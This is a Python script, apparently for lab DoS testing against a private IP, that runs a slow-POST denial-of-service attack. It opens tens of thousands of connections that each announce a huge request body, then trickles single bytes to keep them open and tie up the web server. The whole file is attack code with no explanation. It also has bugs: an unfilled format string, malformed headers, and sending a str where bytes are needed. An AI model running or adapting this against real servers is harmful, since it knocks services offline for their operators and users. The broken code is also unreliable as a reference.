import socket
import time
import threading

MAX_CONN = 60000
PORT = 80
HOST = "192.168.75.144"
PAGE = "/index.html"

buf = (b"POST %s HTTP/1.1\r\n Host: %s\r\n Content-Length: 10000000\r\n Cookie: dklkt_dos_test\r\n")

socks = []

def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf)
            print(f"Send buf OK!,conn={str(i)}\n")
            socks.append(s)
        except Exception as e:
            print(f"Could not connect to server or send error:{e}")
            time.sleep(10)

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
                # print "send OK!"
            except Exception as e:
                print(f"Send Exception:{e}\n")
                socks.remove(s)
                s.close()
        time.sleep(1)

conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())

conn_th.start()
send_th.start()